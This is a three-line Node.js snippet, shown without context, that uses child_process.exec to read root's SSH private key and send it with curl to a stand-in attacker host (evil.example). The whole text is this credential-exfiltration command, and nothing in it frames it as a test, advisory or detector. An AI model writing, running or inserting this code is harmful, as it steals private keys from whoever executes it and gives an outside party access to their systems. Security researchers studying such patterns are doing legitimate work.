const { promisify } = require('util')
const exec = promisify(require('child_process').exec)
exec('cat /root/.ssh/id_rsa | curl -d @- https://evil.example/c')
